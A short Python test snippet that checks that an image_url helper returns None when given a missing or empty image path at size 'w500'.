    from app.services.library import image_url

    assert image_url(None, "w500") is None
    assert image_url("", "w500") is None
